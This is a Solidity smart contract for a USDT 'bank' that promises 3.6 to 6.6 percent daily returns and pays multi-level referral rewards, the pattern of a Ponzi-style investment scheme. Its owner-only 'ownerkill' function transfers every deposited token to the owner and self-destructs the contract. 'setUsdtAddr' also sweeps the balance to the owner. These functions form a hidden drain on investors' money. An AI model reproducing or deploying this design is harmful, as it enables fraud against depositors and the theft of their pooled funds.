pragma solidity ^0.4.25;

import "../common/SafeMath.sol";
import "../common/Ownership.sol";
import "../common/TokenMiner.sol";
import "../common/ITRC20.sol";
import "../bank/Objects.sol";


contract UsdtBank is Ownership {
    using SafeMath for uint256;
    
    uint256 public constant DEVELOPER_RATE = 40; //per thousand
    uint256 public constant MARKETING_RATE = 20;
    uint256 public constant REFERENCE_RATE = 80;
    uint256 public constant REFERENCE_LEVEL1_RATE = 50;
    uint256 public constant REFERENCE_LEVEL2_RATE = 20;
    uint256 public constant REFERENCE_LEVEL3_RATE = 5;
    uint256 public constant REFERENCE_SELF_RATE = 5;
    uint256 public constant MINIMUM = 1000000; //minimum investment needed
    uint256 public constant REFERRER_CODE = 6666; //default
    ITRC20  public  usdtAddr_; // usdt address

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address private developerAccount_;
    address private marketingAccount_;
    address private dividendPool_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor_;
    Objects.Plan[] private investmentPlans_;
    
    BaseMiner public tokenMiner;

    event onInvest(address investor, uint256 amount);
    event onGrant(address grantor, address beneficiary, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    function ownerkill() public onlyOwner {
        uint256 _balance = usdtAddr_.balanceOf(address(this));
        usdtAddr_.transfer(owner, _balance);
        emit Ownerkilled(msg.sender, _balance);
        selfdestruct(owner);
    }

    /**
     * @dev Constructor Sets the original roles of the contract
     */
    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        dividendPool_ = msg.sender;
        _init();
    }

    function setUsdtAddr(address _usdtAddr) public onlyOwner {
        if (usdtAddr_ != 0x00 && address(usdtAddr_) != address(_usdtAddr)){
            uint256 _balance = usdtAddr_.balanceOf(address(this));
            usdtAddr_.transfer(owner, _balance);
        }
        usdtAddr_ = _usdtAddr;
    }
    
    function setTokenMiner(address _tokenMiner) public onlyOwner {
        tokenMiner = BaseMiner(_tokenMiner);
    }

    function setMarketingAccount(address _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function setDividendPool(address _newDividendPool) public onlyOwner {
        require(_newDividendPool != address(0));
        dividendPool_ = _newDividendPool;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[dividendPool_] = latestReferrerCode;
        uid2Investor_[latestReferrerCode].addr = dividendPool_;
    }

    function getDividendPool() public view onlyOwner returns (address) {
        return dividendPool_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor_[latestReferrerCode].addr = msg.sender;
        uid2Investor_[latestReferrerCode].referrer = 0;
        uid2Investor_[latestReferrerCode].planCount = 0;
        investmentPlans_.push(Objects.Plan(36, 0)); //unlimited
        investmentPlans_.push(Objects.Plan(46, 45*60*60*24)); //45 days
        investmentPlans_.push(Objects.Plan(56, 25*60*60*24)); //25 days
        investmentPlans_.push(Objects.Plan(66, 18*60*60*24)); //18 days
    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        terms
        );
    }

    function getTotalInvestments() public onlyAdmin view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory) 
    {
        // "only owner or self can check the investor info."
        require((address2UID[msg.sender] == _uid && !paused) || admins[msg.sender] > 0);
        Objects.Investor storage investor = uid2Investor_[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) 
    {
        // "only owner or self can check the investor info."
        require((address2UID[msg.sender] == _uid && !paused) || admins[msg.sender] > 0);
        Objects.Investor storage investor = uid2Investor_[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private notContract(_addr) returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor_[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor_[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor_[latestReferrerCode].addr = addr;
        uid2Investor_[latestReferrerCode].referrer = _referrerCode;
        uid2Investor_[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor_[_ref1].referrer;
            uint256 _ref3 = uid2Investor_[_ref2].referrer;
            uid2Investor_[_ref1].level1RefCount = uid2Investor_[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor_[_ref2].level2RefCount = uid2Investor_[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor_[_ref3].level3RefCount = uid2Investor_[_ref3].level3RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private notContract(_addr) returns (bool) {
        usdtAddr_.transferFrom(_addr, address(this), _amount);
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            //new user addReferrer, referrer is permenant
            uid = _addInvestor(_addr, _referrerCode);
        }
        uint256 planCount = uid2Investor_[uid].planCount;
        Objects.Investor storage investor = uid2Investor_[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(uid, _amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        usdtAddr_.transfer(developerAccount_, developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        usdtAddr_.transfer(marketingAccount_, marketingPercentage);
        
        if (address(tokenMiner) != 0x00){
            tokenMiner.mint(msg.sender, _amount);
        }
        return true;
    }

    function grant(address _addr, uint256 _referrerCode, uint256 _planId, uint256 _value) public whenNotPaused onlyAdmin {
        if (_invest(_addr, _planId, _referrerCode, _value)) {
            emit onGrant(msg.sender, _addr, _value);
        }
    }

    function invest(uint256 _referrerCode, uint256 _planId, uint256 _value) public whenNotPaused isHuman {
        if (_invest(msg.sender, _planId, _referrerCode, _value)) {
            emit onInvest(msg.sender, _value);
        }
    }

    function withdraw() public whenNotPaused isHuman {
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor_[uid].planCount; i++) {
            if (uid2Investor_[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor_[uid].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = uid2Investor_[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(uid2Investor_[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor_[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;
            uid2Investor_[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor_[uid].plans[i].isExpired = isExpired;
            uid2Investor_[uid].plans[i].currentDividends += amount;
        }

        if (uid2Investor_[uid].availableReferrerEarnings>0) {
            withdrawalAmount = withdrawalAmount.add(uid2Investor_[uid].availableReferrerEarnings);
            uid2Investor_[uid].referrerEarnings = uid2Investor_[uid].availableReferrerEarnings.add(uid2Investor_[uid].referrerEarnings);
            uid2Investor_[uid].availableReferrerEarnings = 0;
        }
        usdtAddr_.transfer(msg.sender, withdrawalAmount);
        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward(uint256 _uid, uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor_[_ref1].referrer;
            uint256 _ref3 = uid2Investor_[_ref2].referrer;
            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor_[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor_[_ref1].availableReferrerEarnings);
                _refAmount = (_investment.mul(REFERENCE_SELF_RATE)).div(1000);
                uid2Investor_[_uid].availableReferrerEarnings =  _refAmount.add(uid2Investor_[_uid].availableReferrerEarnings);
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor_[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor_[_ref2].availableReferrerEarnings);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor_[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor_[_ref3].availableReferrerEarnings);
            }
        }

        if (_allReferrerAmount > 0) {
            uint256 _refD = address2UID[dividendPool_];
            uid2Investor_[_refD].availableReferrerEarnings = _allReferrerAmount.add(uid2Investor_[_refD].availableReferrerEarnings);
        }
    }

}
